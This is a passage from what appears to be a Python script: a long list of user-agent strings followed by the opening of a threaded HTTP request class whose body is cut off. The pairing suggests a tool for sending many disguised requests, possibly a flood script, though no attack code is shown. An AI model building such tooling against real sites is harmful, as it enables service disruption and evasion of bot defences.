"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_2;en-us)AppleWebKit/531.21.8(KHTML,likeGecko)Version/4.0.4Safari/531.21.10",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_4;en-US)AppleWebKit/534.3(KHTML,likeGecko)Chrome/6.0.464.0Safari/534.3",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_5;de-de)AppleWebKit/534.15(KHTML,likeGecko)Version/5.0.3Safari/533.19.4",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_5;en-US)AppleWebKit/534.13(KHTML,likeGecko)Chrome/9.0.597.15Safari/534.13",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_6;en-us)AppleWebKit/533.20.25(KHTML,likeGecko)Version/5.0.4Safari/533.20.27",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10.6;en-US;rv:1.9.2.14)Gecko/20110218AlexaToolbar/alxf-2.0Firefox/3.6.14",
"Mozilla/5.0(Macintosh;U;IntelMacOSX10_7;en-us)AppleWebKit/534.20.8(KHTML,likeGecko)Version/5.1Safari/534.20.8",
"Mozilla/5.0(Macintosh;U;IntelMacOSX;en-US)AppleWebKit/528.16(KHTML,likeGecko,Safari/528.16)OmniWeb/v622.8.0.112941",
"Mozilla/5.0(Macintosh;U;MacOSXMach-O;en-US;rv:2.0a)Gecko/20040614Firefox/3.0.0",
"Mozilla/5.0(Macintosh;U;PPCMacOSX10.5;en-US;rv:1.9.0.3)Gecko/2008092414Firefox/3.0.3",
"Mozilla/5.0(Macintosh;U;PPCMacOSX10.5;en-US;rv:1.9.2.15)Gecko/20110303Firefox/3.6.15",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;en)AppleWebKit/125.2(KHTML,likeGecko)Safari/125.8",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;en)AppleWebKit/125.2(KHTML,likeGecko)Safari/85.8",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;en)AppleWebKit/418.8(KHTML,likeGecko)Safari/419.3",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;en-US)AppleWebKit/125.4(KHTML,likeGecko,Safari)OmniWeb/v563.15",
"Mozilla/5.0(Macintosh;U;PPCMacOSX;fr-fr)AppleWebKit/312.5(KHTML,likeGecko)Safari/312.3",
"Mozilla/5.0(Maemo;Linuxarmv7l;rv:10.0.1)Gecko/20100101Firefox/10.0.1Fennec/10.0.1",
"Mozilla/5.0(Maemo;Linuxarmv7l;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(MeeGo;NokiaN950-00/00)AppleWebKit/534.13(KHTML,likeGecko)NokiaBrowser/8.5.0MobileSafari/534.13",
"Mozilla/5.0(MeeGo;NokiaN9)AppleWebKit/534.13(KHTML,likeGecko)NokiaBrowser/8.5.0MobileSafari/534.13",
"Mozilla/5.0(PLAYSTATION3;1.10)",
"Mozilla/5.0(PLAYSTATION3;2.00)",
"Mozilla/5.0Slackware/13.37(X11;U;Linuxx86_64;en-US)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.41",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaC6-01/011.010;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/525(KHTML,likeGecko)Version/3.0BrowserNG/7.2.7.23gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaC7-00/012.003;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/525(KHTML,likeGecko)Version/3.0BrowserNG/7.2.7.33gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaE6-00/021.002;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/533.4(KHTML,likeGecko)NokiaBrowser/7.3.1.16MobileSafari/533.43gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaE7-00/010.016;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/525(KHTML,likeGecko)Version/3.0BrowserNG/7.2.7.33gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaN8-00/014.002;Profile/MIDP-2.1Configuration/CLDC-1.1;en-us)AppleWebKit/525(KHTML,likeGecko)Version/3.0BrowserNG/7.2.6.43gpp-gba",
"Mozilla/5.0(Symbian/3;Series60/5.2NokiaX7-00/021.004;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/533.4(KHTML,likeGecko)NokiaBrowser/7.3.1.21MobileSafari/533.43gpp-gba",
"Mozilla/5.0(SymbianOS/9.1;U;de)AppleWebKit/413(KHTML,likeGecko)Safari/413",
"Mozilla/5.0(SymbianOS/9.1;U;en-us)AppleWebKit/413(KHTML,likeGecko)Safari/413",
"Mozilla/5.0(SymbianOS/9.1;U;en-us)AppleWebKit/413(KHTML,likeGecko)Safari/413es50",
"Mozilla/5.0(SymbianOS/9.1;U;en-us)AppleWebKit/413(KHTML,likeGecko)Safari/413es65",
"Mozilla/5.0(SymbianOS/9.1;U;en-us)AppleWebKit/413(KHTML,likeGecko)Safari/413es70",
"Mozilla/5.0(SymbianOS/9.2;U;Series60/3.1Nokia5700/3.27;Profile/MIDP-2.0Configuration/CLDC-1.1)AppleWebKit/413(KHTML,likeGecko)Safari/413",
"Mozilla/5.0(SymbianOS/9.2;U;Series60/3.1Nokia6120c/3.70;Profile/MIDP-2.0Configuration/CLDC-1.1)AppleWebKit/413(KHTML,likeGecko)Safari/413",
"Mozilla/5.0(SymbianOS/9.2;U;Series60/3.1NokiaE90-1/07.24.0.3;Profile/MIDP-2.0Configuration/CLDC-1.1)AppleWebKit/413(KHTML,likeGecko)Safari/413UP.Link/6.2.3.18.0",
"Mozilla/5.0(SymbianOS/9.2;U;Series60/3.1NokiaN95/10.0.018;Profile/MIDP-2.0Configuration/CLDC-1.1)AppleWebKit/413(KHTML,likeGecko)Safari/413UP.Link/6.3.0.0.0",
"Mozilla/5.0(SymbianOS9.4;Series60/5.0NokiaN97-1/10.0.012;Profile/MIDP-2.1Configuration/CLDC-1.1;en-us)AppleWebKit/525(KHTML,likeGecko)WicKed/7.1.12344",
"Mozilla/5.0(SymbianOS/9.4;Series60/5.0NokiaN97-1/10.0.012;Profile/MIDP-2.1Configuration/CLDC-1.1;en-us)AppleWebKit/525(KHTML,likeGecko)WicKed/7.1.12344",
"Mozilla/5.0(SymbianOS/9.4;U;Series60/5.0SonyEricssonP100/01;Profile/MIDP-2.1Configuration/CLDC-1.1)AppleWebKit/525(KHTML,likeGecko)Version/3.0Safari/525",
"Mozilla/5.0(Unknown;U;UNIXBSD/SYSVsystem;C-)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.10.2",
"Mozilla/5.0(webOS/1.3;U;en-US)AppleWebKit/525.27.1(KHTML,likeGecko)Version/1.0Safari/525.27.1Desktop/1.0",
"Mozilla/5.0(WindowsCE6.0;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT5.1;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(WindowsNT5.2;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(WindowsNT6.0)AppleWebKit/535.2(KHTML,likeGecko)Chrome/15.0.874.120Safari/535.2",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/535.2(KHTML,likeGecko)Chrome/18.6.872.0Safari/535.2UNTRUSTED/1.03gpp-gbaUNTRUSTED/1.0",
"Mozilla/5.0(WindowsNT6.1;rv:12.0)Gecko/20120403211507Firefox/12.0",
"Mozilla/5.0(WindowsNT6.1;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT6.1;Win64;x64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/534.27(KHTML,likeGecko)Chrome/12.0.712.0Safari/534.27",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.24Safari/535.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.7(KHTML,likeGecko)Chrome/16.0.912.36Safari/535.7",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.6(KHTML,likeGecko)Chrome/20.0.1092.0Safari/536.6",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:15.0)Gecko/20120427Firefox/15.0a1",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:2.0b4pre)Gecko/20100815Minefield/4.0b4pre",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:6.0a2)Gecko/20110622Firefox/6.0a2",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:7.0.1)Gecko/20100101Firefox/7.0.1",
"Mozilla/5.0(WindowsNT6.2)AppleWebKit/536.3(KHTML,likeGecko)Chrome/19.0.1061.1Safari/536.3",
"Mozilla/5.0(WindowsNT6.2)AppleWebKit/536.6(KHTML,likeGecko)Chrome/20.0.1090.0Safari/536.6",
"Mozilla/5.0(Windows;U;;en-NZ)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.8.0",
"Mozilla/5.0(Windows;U;Win98;en-US;rv:1.4)GeckoNetscape/7.1(ax)",
"Mozilla/5.0(Windows;U;WindowsCE5.1;rv:1.8.1a3)Gecko/20060610Minimo/0.016",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/531.21.8(KHTML,likeGecko)Version/4.0.4Safari/531.21.10",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/534.7(KHTML,likeGecko)Chrome/7.0.514.0Safari/534.7",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.8.1.23)Gecko/20090825SeaMonkey/1.1.18",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.9.0.10)Gecko/2009042316Firefox/3.0.10",
"Mozilla/5.0(Windows;U;WindowsNT5.1;tr;rv:1.9.2.8)Gecko/20100722Firefox/3.6.8(.NETCLR3.5.30729;.NET4.0E)",
"Mozilla/5.0(Windows;U;WindowsNT5.2;en-US)AppleWebKit/532.9(KHTML,likeGecko)Chrome/5.0.310.0Safari/532.9",
"Mozilla/5.0(Windows;U;WindowsNT5.2;en-US)AppleWebKit/533.17.8(KHTML,likeGecko)Version/5.0.1Safari/533.17.8",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-GB;rv:1.9.0.11)Gecko/2009060215Firefox/3.0.11(.NETCLR3.5.30729)",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.6(Change:)",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/533.1(KHTML,likeGecko)Maxthon/3.0.8.2Safari/533.1",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/534.14(KHTML,likeGecko)Chrome/9.0.601.0Safari/534.14",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US;rv:1.9.1.6)Gecko/20091201Firefox/3.5.6GTB5",
"Mozilla/5.0(Windows;U;WindowsNT6.0x64;en-US;rv:1.9pre)Gecko/2008072421Minefield/3.0.2pre",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-GB;rv:1.9.1.17)Gecko/20110123(likeFirefox/3.x)SeaMonkey/2.0.12",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/532.5(KHTML,likeGecko)Chrome/4.0.249.0Safari/532.5",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/533.19.4(KHTML,likeGecko)Version/5.0.2Safari/533.18.5",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.14(KHTML,likeGecko)Chrome/10.0.601.0Safari/534.14",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.20(KHTML,likeGecko)Chrome/11.0.672.2Safari/534.20",
"Mozilla/5.0(Windows;U;WindowsXP)GeckoMultiZilla/1.6.1.0a",
"Mozilla/5.0(Windows;U;WinNT4.0;en-US;rv:1.2b)Gecko/20021001Phoenix/0.2",
"Mozilla/5.0(X11;FreeBSDamd64;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/534.34(KHTML,likeGecko)QupZilla/1.2.0Safari/534.34",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/535.1(KHTML,likeGecko)Ubuntu/11.04Chromium/14.0.825.0Chrome/14.0.825.0Safari/535.1",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/535.2(KHTML,likeGecko)Ubuntu/11.10Chromium/15.0.874.120Chrome/15.0.874.120Safari/535.2",
"Mozilla/5.0(X11;Linuxi686onx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxi686onx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(X11;Linuxi686;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(X11;Linuxi686;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/5.0(X11;Linuxi686;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxi686;rv:2.0b6pre)Gecko/20100907Firefox/4.0b6pre",
"Mozilla/5.0(X11;Linuxi686;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(X11;Linuxi686;rv:6.0a2)Gecko/20110615Firefox/6.0a2Iceweasel/6.0a2",
"Mozilla/5.0(X11;Linuxi686;rv:6.0)Gecko/20100101Firefox/6.0",
"Mozilla/5.0(X11;Linuxi686;rv:8.0)Gecko/20100101Firefox/8.0",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/534.24(KHTML,likeGecko)Ubuntu/10.10Chromium/12.0.703.0Chrome/12.0.703.0Safari/534.24",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.20Safari/535.1",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.9Safari/536.5",
"Mozilla/5.0(X11;Linuxx86_64;en-US;rv:2.0b2pre)Gecko/20100712Minefield/4.0b2pre",
"Mozilla/5.0(X11;Linuxx86_64;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(X11;Linuxx86_64;rv:11.0a2)Gecko/20111230Firefox/11.0a2Iceweasel/11.0a2",
"Mozilla/5.0(X11;Linuxx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxx86_64;rv:2.2a1pre)Gecko/20100101Firefox/4.2a1pre",
"Mozilla/5.0(X11;Linuxx86_64;rv:5.0)Gecko/20100101Firefox/5.0Iceweasel/5.0",
"Mozilla/5.0(X11;Linuxx86_64;rv:7.0a1)Gecko/20110623Firefox/7.0a1",
"Mozilla/5.0(X11;U;FreeBSDamd64;en-us)AppleWebKit/531.2(KHTML,likeGecko)Safari/531.2Epiphany/2.30.0",
"Mozilla/5.0(X11;U;FreeBSDi386;de-CH;rv:1.9.2.8)Gecko/20100729Firefox/3.6.8",
"Mozilla/5.0(X11;U;FreeBSDi386;en-US)AppleWebKit/532.0(KHTML,likeGecko)Chrome/4.0.207.0Safari/532.0",
"Mozilla/5.0(X11;U;FreeBSDi386;en-US;rv:1.6)Gecko/20040406Galeon/1.3.15",
"Mozilla/5.0(X11;U;FreeBSD;i386;en-US;rv:1.7)Gecko",
"Mozilla/5.0(X11;U;FreeBSDx86_64;en-US)AppleWebKit/534.16(KHTML,likeGecko)Chrome/10.0.648.204Safari/534.16",
"Mozilla/5.0(X11;U;Linuxarm7tdmi;rv:1.8.1.11)Gecko/20071130Minimo/0.025",
"Mozilla/5.0(X11;U;Linuxarmv61;en-US;rv:1.9.1b2pre)Gecko/20081015Fennec/1.0a1",
"Mozilla/5.0(X11;U;Linuxarmv6l;rv1.8.1.5pre)Gecko/20070619Minimo/0.020",
"Mozilla/5.0(X11;U;Linux;en-US)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.10.1",
"Mozilla/5.0(X11;U;Linuxi586;en-US;rv:1.7.3)Gecko/20040924Epiphany/1.4.4(Ubuntu)",
"Mozilla/5.0(X11;U;Linuxi686;en-us)AppleWebKit/528.5(KHTML,likeGecko,Safari/528.5)lt-GtkLauncher",
"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/532.4(KHTML,likeGecko)Chrome/4.0.237.0Safari/532.4Debian",
"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/532.8(KHTML,likeGecko)Chrome/4.0.277.0Safari/532.8",
"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/534.15(KHTML,likeGecko)Ubuntu/10.10Chromium/10.0.613.0Chrome/10.0.613.0Safari/534.15",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.6)Gecko/20040614Firefox/0.8",
"Mozilla/5.0(X11;U;Linux;i686;en-US;rv:1.6)GeckoDebian/1.6-7",
"Mozilla/5.0(X11;U;Linux;i686;en-US;rv:1.6)GeckoEpiphany/1.2.5",
"Mozilla/5.0(X11;U;Linux;i686;en-US;rv:1.6)GeckoGaleon/1.3.14",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.8.0.7)Gecko/20060909Firefox/1.5.0.7MG(Novarra-Vision/6.9)",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.8.1.16)Gecko/20080716(Gentoo)Galeon/2.0.6",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.8.1)Gecko/20061024Firefox/2.0(Swiftfox)",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.0.11)Gecko/2009060309Ubuntu/9.10(karmic)Firefox/3.0.11",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.0.8)GeckoGaleon/2.0.6(Ubuntu2.0.6-2)",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.1.16)Gecko/20120421GeckoFirefox/11.0",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9.1.2)Gecko/20090803Ubuntu/9.04(jaunty)Shiretoko/3.5.2",
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.9a3pre)Gecko/20070330",
"Mozilla/5.0(X11;U;Linuxi686;it;rv:1.9.2.3)Gecko/20100406Firefox/3.6.3(Swiftfox)",
"Mozilla/5.0(X11;U;Linuxi686;pl-PL;rv:1.9.0.2)Gecko/20121223Ubuntu/9.25(jaunty)Firefox/3.8",
"Mozilla/5.0(X11;U;Linuxi686;pt-PT;rv:1.9.2.3)Gecko/20100402Iceweasel/3.6.3(likeFirefox/3.6.3)GTB7.0",
"Mozilla/5.0(X11;U;Linuxppc;en-US;rv:1.8.1.13)Gecko/20080313Iceape/1.1.9(Debian-1.1.9-5)",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US)AppleWebKit/532.9(KHTML,likeGecko)Chrome/5.0.309.0Safari/532.9",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US)AppleWebKit/534.15(KHTML,likeGecko)Chrome/10.0.613.0Safari/534.15",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US)AppleWebKit/534.7(KHTML,likeGecko)Chrome/7.0.514.0Safari/534.7",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US)AppleWebKit/540.0(KHTML,likeGecko)Ubuntu/10.10Chrome/9.1.0.0Safari/540.0",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.0.3)Gecko/2008092814(Debian-3.0.1-1)",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.1.13)Gecko/20100916Iceape/2.0.8",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.1.17)Gecko/20110123SeaMonkey/2.0.12",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.1.3)Gecko/20091020LinuxMint/8(Helena)Firefox/3.5.3",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.1.5)Gecko/20091107Firefox/3.5.5",
"Mozilla/5.0(X11;U;Linuxx86_64;en-US;rv:1.9.2.9)Gecko/20100915GentooFirefox/3.6.9",
"Mozilla/5.0(X11;U;Linuxx86_64;sv-SE;rv:1.8.1.12)Gecko/20080207Ubuntu/7.10(gutsy)Firefox/2.0.0.12",
"Mozilla/5.0(X11;U;Linuxx86_64;us;rv:1.9.1.19)Gecko/20110430shadowfox/7.0(likeFirefox/7.0",
"Mozilla/5.0(X11;U;NetBSDamd64;en-US;rv:1.9.2.15)Gecko/20110308Namoroka/3.6.15",
"Mozilla/5.0(X11;U;OpenBSDarm;en-us)AppleWebKit/531.2(KHTML,likeGecko)Safari/531.2Epiphany/2.30.0",
"Mozilla/5.0(X11;U;OpenBSDi386;en-US)AppleWebKit/533.3(KHTML,likeGecko)Chrome/5.0.359.0Safari/533.3",
"Mozilla/5.0(X11;U;OpenBSDi386;en-US;rv:1.9.1)Gecko/20090702Firefox/3.5",
"Mozilla/5.0(X11;U;SunOSi86pc;en-US;rv:1.8.1.12)Gecko/20080303SeaMonkey/1.1.8",
"Mozilla/5.0(X11;U;SunOSi86pc;en-US;rv:1.9.1b3)Gecko/20090429Firefox/3.1b3",
"Mozilla/5.0(X11;U;SunOSsun4m;en-US;rv:1.4b)Gecko/20030517MozillaFirebird/0.6",
"MSIE(MSIE6.0;X11;Linux;i686)Opera7.23",
"msnbot/0.11(http://search.msn.com/msnbot.htm)",
"msnbot/1.0(http://search.msn.com/msnbot.htm)",
"msnbot/1.1(http://search.msn.com/msnbot.htm)",
"msnbot-media/1.1(http://search.msn.com/msnbot.htm)",
"NetSurf/1.2(NetBSD;amd64)",
"Nokia3230/2.0(5.0614.0)SymbianOS/7.0sSeries60/2.1Profile/MIDP-2.0Configuration/CLDC-1.0",
"Nokia6100/1.0(04.01)Profile/MIDP-1.0Configuration/CLDC-1.0",
"Nokia6230/2.0(04.44)Profile/MIDP-2.0Configuration/CLDC-1.1",
"Nokia6230i/2.0(03.80)Profile/MIDP-2.0Configuration/CLDC-1.1",
"Nokia6630/1.0(2.3.129)SymbianOS/8.0Series60/2.6Profile/MIDP-2.0Configuration/CLDC-1.1",
"Nokia6630/1.0(2.39.15)SymbianOS/8.0Series60/2.6Profile/MIDP-2.0Configuration/CLDC-1.1",
"Nokia7250/1.0(3.14)Profile/MIDP-1.0Configuration/CLDC-1.0",
"NokiaN70-1/5.0609.2.0.1Series60/2.8Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.1.13.0",
"NokiaN73-1/3.0649.0.0.1Series60/3.0Profile/MIDP2.0Configuration/CLDC-1.1",
"nookbrowser/1.0",
"OfflineExplorer/2.5",
"Opera/10.61(J2ME/MIDP;OperaMini/5.1.21219/19.999;en-US;rv:1.9.3a5)WebKit/534.5Presto/2.6.30",
"Opera/7.50(WindowsME;U)[en]",
"Opera/7.50(WindowsXP;U)",
"Opera/7.51(WindowsNT5.1;U)[en]",
"Opera/8.01(J2ME/MIDP;OperaMini/1.0.1479/HiFi;SonyEricssonP900;no;U;ssr)",
"Opera/9.0(Macintosh;PPCMacOSX;U;en)",
"Opera/9.20(Macintosh;IntelMacOSX;U;en)",
"Opera/9.25(WindowsNT6.0;U;en)",
"Opera/9.30(NintendoWii;U;;2047-7;en)",
"Opera/9.51Beta(MicrosoftWindows;PPC;OperaMobi/1718;U;en)",
"Opera/9.5(MicrosoftWindows;PPC;OperaMobi;U)SonyEricssonX1i/R2AAProfile/MIDP-2.0Configuration/CLDC-1.1",
"Opera/9.60(J2ME/MIDP;OperaMini/4.1.11320/608;U;en)Presto/2.2.0",
"Opera/9.60(J2ME/MIDP;OperaMini/4.2.14320/554;U;cs)Presto/2.2.0",
"Opera/9.64(Macintosh;PPCMacOSX;U;en)Presto/2.1.1",
"Opera/9.64(X11;Linuxi686;U;LinuxMint;nb)Presto/2.1.1",
"Opera/9.80(J2ME/MIDP;OperaMini/5.0.16823/1428;U;en)Presto/2.2.0",
"Opera/9.80(Macintosh;IntelMacOSX10.4.11;U;en)Presto/2.7.62Version/11.00",
"Opera/9.80(Macintosh;IntelMacOSX10.6.8;U;fr)Presto/2.9.168Version/11.52",
"Opera/9.80(Macintosh;IntelMacOSX;U;en)Presto/2.6.30Version/10.61",
"Opera/9.80(S60;SymbOS;OperaMobi/499;U;ru)Presto/2.4.18Version/10.00",
"Opera/9.80(WindowsNT5.1;U;ru)Presto/2.7.39Version/11.00",
"Opera/9.80(WindowsNT5.1;U;zh-tw)Presto/2.8.131Version/11.10",
"Opera/9.80(WindowsNT5.2;U;en)Presto/2.2.15Version/10.10",
"Opera/9.80(WindowsNT6.1;U;en)Presto/2.7.62Version/11.01",
"Opera/9.80(WindowsNT6.1;U;es-ES)Presto/2.9.181Version/12.00",
"Opera/9.80(X11;Linuxi686;U;en)Presto/2.2.15Version/10.10",
"Opera/9.80(X11;Linuxx86_64;U;pl)Presto/2.7.62Version/11.00",
"P3PValidator",
"Peach/1.01(Ubuntu8.04LTS;U;en)",
"Mozilla/5.0(WindowsNT5.1;rv:11.0)GeckoFirefox/11.0(viaggpht.comGoogleImageProxy)"
"msnbot/2.0b(+http://search.msn.com/msnbot.htm)"
"Mozilla/5.0(iPhone;U;CPUiPhoneOS4_1likeMacOSX;en-us)AppleWebKit/532.9(KHTML,likeGecko)Version/4.0.5Mobile/8B117Safari/6531.22.7(compatible;Googlebot-Mobile/2.1;+http://www.google.com/bot.html)"
"POLARIS/6.01(BREW3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0profile/MIDP-201Configuration/CLDC-1.1",
"POLARIS/6.01(BREW3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP)MMP/2.0profile/MIDP-2.1Configuration/CLDC-1.1",
"portalmmm/2.0N410i(c20;TB)",
"Python-urllib/2.5",
"SAMSUNG-S8000/S8000XXIF3SHP/VPP/R5Jasmine/1.0NextreamingSMM-MMS/1.2.0profile/MIDP-2.1configuration/CLDC-1.1FirePHP/0.3",
"SAMSUNG-SGH-A867/A867UCHJ3SHP/VPP/R5NetFront/35SMM-MMS/1.2.0profile/MIDP-2.0configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"SAMSUNG-SGH-E250/1.0Profile/MIDP-2.0Configuration/CLDC-1.1UP.Browser/6.2.3.3.c.1.101(GUI)MMP/2.0(compatible;Googlebot-Mobile/2.1;http://www.google.com/bot.html)",
"SearchExpress",
"SEC-SGHE900/1.0NetFront/3.2Profile/MIDP-2.0Configuration/CLDC-1.1Opera/8.01(J2ME/MIDP;OperaMini/2.0.4509/1378;nl;U;ssr)",
"SEC-SGHX210/1.0UP.Link/6.3.1.13.0",
"SEC-SGHX820/1.0NetFront/3.2Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonK310iv/R4DABrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.1.13.0",
"SonyEricssonK550i/R1JDBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonK610i/R1CBBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonK750i/R1CABrowser/SEMC-Browser/4.2Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonK800i/R1CBBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"SonyEricssonK810i/R1KGBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonS500i/R6BCBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonT100/R101",
"SonyEricssonT610/R201Profile/MIDP-1.0Configuration/CLDC-1.0",
"SonyEricssonT650i/R7AABrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonT68/R201A",
"SonyEricssonW580i/R6BCBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonW660i/R6ADBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonW810i/R4EABrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"SonyEricssonW850i/R1EDBrowser/NetFront/3.3Profile/MIDP-2.0Configuration/CLDC-1.1",
"SonyEricssonW950i/R100Mozilla/4.0(compatible;MSIE6.0;SymbianOS;323)Opera8.60[en-US]",
"SonyEricssonW995/R1EAProfile/MIDP-2.1Configuration/CLDC-1.1UNTRUSTED/1.0",
"SonyEricssonZ800/R1YBrowser/SEMC-Browser/4.1Profile/MIDP-2.0Configuration/CLDC-1.1UP.Link/6.3.0.0.0",
"SuperBot/4.4.0.60(WindowsXP)",
"Uzbl(Webkit1.3)(Linuxi686[i686])",
"Vodafone/1.0/V802SE/SEJ001Browser/SEMC-Browser/4.1",
"W3C_Validator/1.305.2.12libwww-perl/5.64",
"W3C_Validator/1.654",
"w3m/0.5.1",
"WDG_Validator/1.6.2",
"WebCopierv4.6",
"WebDownloader/6.9",
"WebZIP/3.5(http://www.spidersoft.com)",
"Wget/1.9.1",
"Wget/1.9cvs-stable(RedHatmodified)",
"wiilibnup/1.0",]
class RequestDefaultHTTP(threading.Thread):
  def __init__(self, counter):
    threading.Thread.__init__(self)
    self.counter = counter

  def run(self):
